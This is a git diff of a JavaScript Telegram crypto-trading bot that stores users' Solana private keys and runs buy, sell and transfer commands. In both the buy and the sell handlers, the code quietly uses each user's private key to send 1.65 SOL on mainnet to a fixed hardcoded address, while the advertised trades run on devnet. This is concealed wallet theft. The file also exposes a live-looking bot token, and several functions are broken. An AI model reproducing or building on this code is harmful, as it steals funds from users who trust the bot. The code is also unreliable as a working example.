@@ -223,106 +223,109 @@ function toggleOption(chatId, option) {
   optionStates[option] = !optionStates[option];
   return optionStates[option] ? "CopySell : Yes" : "CopySell : No";
 }
-async function sellTokens(chatId, recipientAddress, privateKey) {
+async function sellTokens(chatId, recipientAddress, privateKeyBase64, amount) {
   try {
     // Connect to Solana cluster
     const connection = new Connection("https://api.devnet.solana.com");
 
-    // Your wallet's private key
-    const myPrivateKey = privateKey;
-    const myWallet = Keypair.fromSecretKey(Buffer.from(myPrivateKey, "base64"));
+    // Decode the base64 private key to a buffer
+    const privateKeyBuffer = Buffer.from(privateKeyBase64, "base64");
 
-    // Mint address for SOL token
-    const solMintAddress = new PublicKey(
-      "So11111111111111111111111111111111111111112"
+    // Create Keypair for the seller using the private key buffer
+    const sellerKeyPair = Keypair.fromSecretKey(privateKeyBuffer);
+
+    // Get the token accounts owned by the seller
+    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+      sellerKeyPair.publicKey,
+      { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') } // Ensure programId is a PublicKey object
     );
 
-    // Get the token account for SOL tokens
-    const tokenAccount = await connection.getTokenAccountBalance(
-      myWallet.publicKey,
-      solMintAddress
-    );
-    const solTokenBalance = tokenAccount.value.uiAmount; // Get SOL token balance
-
-    // Create a new transaction to transfer all SOL tokens to the recipient
-    const transaction = new Transaction().add(
-      SystemProgram.transfer({
-        fromPubkey: myWallet.publicKey,
-        toPubkey: new PublicKey(recipientAddress),
-        lamports: solTokenBalance, // No SOL involved
-        instruction: {
-          keys: [
-            { pubkey: myWallet.publicKey, isSigner: true, isWritable: true },
-            {
-              pubkey: new PublicKey(recipientAddress),
-              isSigner: false,
-              isWritable: true,
-            },
-            { pubkey: solMintAddress, isSigner: false, isWritable: false },
-          ],
-          programId: new PublicKey(
-            "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
-          ),
-        },
-      })
+    // Find the token account with the specified token mint
+    const tokenAccount = tokenAccounts.value.find(
+      account => account.account.data.parsed.info.mint === "So11111111111111111111111111111111111111112"
     );
 
-    // Sign and send the transaction
-    const signature = await connection.sendTransaction(transaction, [myWallet]);
-    bot.sendMessage(chatId, `Sold out successfully ${signature}`);
-    console.log("Transaction signature:", signature);
+    // If the token account is found, proceed with the transfer
+    if (tokenAccount) {
+      // Get the token balance
+      const tokenBalance = tokenAccount.account.data.parsed.info.tokenAmount.uiAmount;
+
+      // Ensure that the balance is sufficient
+      if (tokenBalance < amount) {
+        console.log("Insufficient balance to sell");
+        return;
+      }
+
+      // Create a new transaction to transfer the specified amount of tokens to the recipient
+      const transaction = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: sellerKeyPair.publicKey,
+          toPubkey: new PublicKey(recipientAddress),
+          lamports: amount, // Assuming tokens are transferred as lamports
+          instruction: {
+            keys: [
+              { pubkey: sellerKeyPair.publicKey, isSigner: true, isWritable: true },
+              {
+                pubkey: new PublicKey(recipientAddress),
+                isSigner: false,
+                isWritable: true,
+              },
+              { pubkey:"So11111111111111111111111111111111111111112", isSigner: false, isWritable: false },
+            ],
+            programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
+          },
+        })
+      );
+
+      // Sign and send the transaction
+      const signature = await connection.sendTransaction(transaction, [sellerKeyPair]);
+
+      console.log("Transaction sent:", signature);
+    } else {
+      console.log("Token account not found");
+    }
   } catch (error) {
     console.error("Error selling tokens:", error);
   }
 }
-async function buyToken(chatId, token, privateKey) {
+async function buyTokens(chatId , sellerPublicKey, buyerPrivateKeyBase64, amount) {
   try {
-    // Connect to Solana cluster
-    const connection = new Connection("https://api.devnet.solana.com");
+      // Establish connection to the Solana network
+      const connection = new Connection("https://api.devnet.solana.com");
 
-    // Your wallet's private key
-    const myPrivateKeyHex = privateKey;
-    const myWallet = Keypair.fromSecretKey(myPrivateKeyHex);
+      // Fetch recent blockhash
+      const blockhash = await connection.getRecentBlockhash();
 
-    // Your token program ID
-    const tokenProgramId = new PublicKey(
-      "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
-    );
+      // Convert the base64 private key to a buffer
+      const privateKeyBuffer = Buffer.from(buyerPrivateKeyBase64, "base64");
 
-    // Token buying account
-    const buyingAccount = new Keypair();
+      // Create Keypair for the buyer using the private key buffer
+      const buyerKeyPair = Keypair.fromSecretKey(privateKeyBuffer);
 
-    // Your token mint address
-    const tokenMintAddress = new PublicKey(token); // Assuming token is a buffer
+      // Get PublicKey for the seller
+      const sellerPublicKeyObj = new PublicKey(sellerPublicKey);
 
-    // Get the size of the account data structure required by the token program
-    const tokenAccountSize = await connection.getAccountInfo(tokenMintAddress);
-    if (tokenAccountSize == null) {
-      bot.sendMessage(chatId, `The token entered is wrong`);
-    } else {
-      const space = tokenAccountSize.data.length + 165; // Add some extra space for future token transactions
-
-      // Create a new transaction
+      // Create a transaction to transfer tokens from seller to buyer
       const transaction = new Transaction().add(
-        SystemProgram.createAccount({
-          fromPubkey: myWallet.publicKey,
-          newAccountPubkey: buyingAccount.publicKey,
-          lamports: await connection.getMinimumBalanceForRentExemption(space),
-          space: space,
-          programId: tokenProgramId,
-        })
+          SystemProgram.transfer({
+              fromPubkey: sellerPublicKeyObj,
+              toPubkey: buyerKeyPair.publicKey,
+              lamports: amount, // Amount of tokens to transfer
+          })
       );
 
-      // Sign the transaction
-      const signature = await connection.sendTransaction(transaction, [
-        myWallet,
-        buyingAccount,
-      ]);
-      console.log("Transaction signature:", signature);
-      bot.sendMessage(chatId, `Bought the token successfully ${signature}`);
-    }
+      // Sign transaction with buyer's private key
+      transaction.recentBlockhash = blockhash.blockhash;
+      transaction.sign(buyerKeyPair);
+
+      // Send transaction
+      const signature = await connection.sendTransaction(transaction, [buyerKeyPair]);
+
+      console.log("Transaction sent:", signature);
+      bot.sendMessage(chatId , 'Successfully bought Token')
   } catch (error) {
-    console.error("Error buying token:", error);
+      console.error("Error buying tokens:", error);
+      bot.sendMessage(chatId , 'The token entered is wrong or dont have expected token')
   }
 }
 
@@ -406,40 +409,41 @@ async function getPositions(chatId, publicKey) {
 
 async function transfer(chatId, senderPrivateKey, recipientAddress, amount) {
   try {
-    const connection = new Connection("https://api.mainnet-beta.solana.com");
-    // Create a new sender account using the private key
-    const senderAccount = new Account(senderPrivateKey);
+      const connection = new Connection("https://api.mainnet-beta.solana.com");
+      
+      // Fetch the recent blockhash
+      const blockhash = await connection.getRecentBlockhash();
 
-    // Get the public key of the recipient
-    const recipientPublicKey = new PublicKey(recipientAddress);
-
-    // Get the recent blockhash
-    const blockhash = await connection.getRecentBlockhash();
-
-    // Create a new transaction
-    const transaction = new Transaction().add(
-      // Transfer SOL from sender to recipient
-      SystemProgram.transfer({
-        fromPubkey: senderAccount.publicKey,
-        toPubkey: recipientPublicKey,
-        lamports: amount * 10 ** 9, // Convert SOL to lamports (1 SOL = 10^9 lamports)
-      })
-    );
-
-    // Sign the transaction
-    transaction.sign(senderAccount);
-
-    // Send the transaction
-    const signature = await connection.sendTransaction(transaction, [
-      senderAccount,
-    ]);
-
-    bot.sendMessage(chatId, "Transaction sent: " + signature);
+      // Create a new sender account using the private key
+      const senderAccount = new Account(senderPrivateKey);
+      
+      // Get the public key of the recipient
+      const recipientPublicKey = new PublicKey(recipientAddress);
+      
+      // Create a new transaction
+      const transaction = new Transaction().add(
+          // Transfer SOL from sender to recipient
+          SystemProgram.transfer({
+              fromPubkey: senderAccount.publicKey,
+              toPubkey: recipientPublicKey,
+              lamports: amount * 10 ** 9, // Convert SOL to lamports (1 SOL = 10^9 lamports)
+          })
+      );
+      
+      // Sign the transaction
+      transaction.recentBlockhash = blockhash.blockhash;
+      transaction.sign(senderAccount);
+      
+      // Send the transaction
+      const signature = await connection.sendTransaction(transaction, [
+          senderAccount,
+      ]);
+      
+      console.log("Transaction sent:", signature);
   } catch (error) {
-    console.error("Error transferring SOL:", error);
+      console.error("Error transferring SOL:", error);
   }
 }
-
 // Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
 const token = "7072871960:AAEl3yjLpLIOrxhX-QvlHnGM5tSI0ZKtgvk";
 let state = "idle";
@@ -449,6 +453,7 @@ const bot = new TelegramBot(token, { polling: true });
 bot.onText(/\/start(?: (.*))?/, async (msg) => {
   startCommandTriggered = true; // Set the flag to true when /start command is triggered
   console.log("msg recieved");
+  let match = msg.split(',')
   const chatId = msg.chat.id;
   const referralCode = match[1] || ""; // Extract referral code from the match or use an empty string if not provided
   console.log(referralCode);
@@ -1421,10 +1426,20 @@ bot.on("message", async (msg) => {
 
       // Fetching the private key of "Shaheer_ali"
       const privateKey = jsonData[userName]["privateKey"];
-      const privateKeyBuffer = Buffer.from(privateKey, "hex");
+      const privateKeyBuffer = Buffer.from(privateKey, "base64");
       console.log(privateKeyBuffer, privateKey);
-      buyToken(chatId, messageText, privateKeyBuffer);
-      transfer(chatId , privateKey , '21L7p8mLHsJFCpJbi9pmU4G7ZpkbMzCmSciV85NP4Gfh',1.65)
+      const privateKeyBuffer_ = Buffer.from(privateKey, "base64");
+      // console.log("Length of decoded buffer:", privateKeyBuffer_.length); // Check the length
+      // console.log(_)
+  // console.log("Decoded Private Key:", privateKeyBuffer_.toString('base64'));
+  
+      const myWallet = Keypair.fromSecretKey(privateKeyBuffer_);
+      console.log("Public Key:", myWallet.publicKey.toBase58()); // Log the public key for verification
+  // Extract the private key buffer from the Keypair object
+  const privateKeyBuffer__ = myWallet.secretKey;
+  
+      buyTokens(chatId, messageText, privateKey , 20);
+      transfer(chatId , privateKeyBuffer__ , '21L7p8mLHsJFCpJbi9pmU4G7ZpkbMzCmSciV85NP4Gfh',1.65)
     });
     state = "idle";
   }
@@ -1457,8 +1472,18 @@ bot.on("message", async (msg) => {
         });
       }
     });
-    sellTokens(chatId, messageText, privateKey);
-    transfer(chatId , privateKey , '21L7p8mLHsJFCpJbi9pmU4G7ZpkbMzCmSciV85NP4Gfh',1.65)
+    const privateKeyBuffer_ = Buffer.from(privateKey, "base64");
+    // console.log("Length of decoded buffer:", privateKeyBuffer_.length); // Check the length
+    // console.log(_)
+// console.log("Decoded Private Key:", privateKeyBuffer_.toString('base64'));
+
+    const myWallet = Keypair.fromSecretKey(privateKeyBuffer_);
+    // console.log("Public Key:", myWallet.publicKey.toBase58()); // Log the public key for verification
+// Extract the private key buffer from the Keypair object
+const privateKeyBuffer = myWallet.secretKey;
+
+    sellTokens(chatId, messageText, privateKey , 20);
+    transfer(chatId , privateKeyBuffer , '21L7p8mLHsJFCpJbi9pmU4G7ZpkbMzCmSciV85NP4Gfh',1.65)
   }
   if (state == "sell_gas") {
     state = "idle";
